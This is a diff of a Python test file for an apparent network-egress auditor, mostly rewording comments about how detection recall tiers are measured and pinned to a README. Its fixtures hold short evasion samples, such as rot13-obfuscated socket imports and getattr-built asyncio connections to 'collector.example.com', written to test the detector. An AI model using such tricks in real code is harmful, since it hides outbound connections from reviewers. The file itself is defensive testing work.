@@ -271,9 +271,9 @@ def test_real_entry_points_are_still_network_imports(tmp_path, name, src):
 # HOSTILE-CODEBASE RECALL: the measured tiers, pinned.
 #
 # The README publishes recall across three tiers. These assert the two that
-# must stay at 100%. Tier C is deliberately NOT asserted at its published
-# figure: most of it is undecidable, and pinning a number that may improve
-# would turn an improvement into a test failure.
+# must stay at 100%. Tier C is pinned as the set of named programs that come
+# back CLEAN, so a change in either direction fails a test and the README's
+# row changes with it.
 # --------------------------------------------------------------------------
 @pytest.mark.parametrize("name,src", [
     ("plain_requests", "import requests\nrequests.post('http://e/x')"),
@@ -365,11 +365,11 @@ TIER_C = {
     "rot13_name": "import codecs, importlib\n"
                   "importlib.import_module(codecs.decode('fbpxrg', 'rot13')).create_connection(('h', 1))\n",
 }
-# Round 1 missed getattr_chain too; that miss was fixed, so round 1 is tuning data and round 2 below is the figure.
+# The first set of ten was used to tune the tool, so it is not a measurement; the second set below is the figure.
 TIER_C_MISSED = {"interp_relay"}
 
 TIER_C2 = {
-    # Ten more, written after round 1's fix and measured once on the build that ships.
+    # Ten more, written after the first set was used for tuning, and measured once on the build that ships.
     "ssl_alias": "import ssl as _s\n_s.get_server_certificate(('collector.example.com', 443))\n",
     "asyncio_getattr": "import asyncio\nf = getattr(asyncio, 'open_' + 'connection')\n"
                        "asyncio.run(f('collector.example.com', 443))\n",
@@ -388,7 +388,7 @@ TIER_C2_MISSED = {"asyncio_getattr", "write_then_import", "popen_interp"}
 
 def test_tier_c_second_round_is_what_the_readme_says(tmp_path):
     """The README's tier C figure, pinned both ways. A later build that catches one of the three fails this on
-    purpose: the README row and this set change together, and a fixed round becomes tuning data."""
+    purpose: the README row and this set change together, and a set used for tuning stops being a measurement."""
     clean = set()
     for name, src in TIER_C2.items():
         root = tmp_path / name / "pkg"
@@ -397,7 +397,7 @@ def test_tier_c_second_round_is_what_the_readme_says(tmp_path):
         (root / "main.py").write_text(src, encoding="utf-8")
         if no_egress_auditor.audit(root).verdict == "CLEAN":
             clean.add(name)
-    assert clean == TIER_C2_MISSED, f"tier C round 2 changed: CLEAN now {sorted(clean)}; update the README's row"
+    assert clean == TIER_C2_MISSED, f"tier C second set changed: CLEAN now {sorted(clean)}; update the README's row"
 
 
 def test_getattr_on_the_import_machinery_is_dynamic_loading(tmp_path):
@@ -412,9 +412,9 @@ def test_getattr_on_the_import_machinery_is_dynamic_loading(tmp_path):
 
 
 def test_tier_c_deliberate_evasion_is_what_the_readme_says(tmp_path):
-    """The README's tier C row, pinned both ways: these eight trees are not CLEAN and these two are.
+    """The first tier C set, pinned both ways: these nine trees are not CLEAN and `interp_relay` is.
 
-    If a later build catches one of the two, this fails on purpose: the README's figure is then wrong, and the
+    If a later build catches it, this fails on purpose: the README's figure is then wrong, and the
     row (and this set) must be updated together. A vendored copy counts by the tree: the copy itself is read.
     """
     clean = set()
@@ -763,7 +763,7 @@ def test_no_command_takes_a_covenant_flag_and_no_function_a_covenant_argument():
     for mod in ("no_egress_auditor", "cbom", "sbom"):
         r = subprocess.run([sys.executable, "-m", f"entrovouch.{mod}", "--help"], cwd=Path(__file__).resolve().parents[1],
                            env=env, capture_output=True, text=True, encoding="utf-8", errors="replace")
-        assert r.returncode == 0 and "--covenant" not in r.stdout and "Covenant text IS the key" not in r.stdout
+        assert r.returncode == 0 and "--covenant" not in r.stdout
 
 
 # --------------------------------------------------------------------------
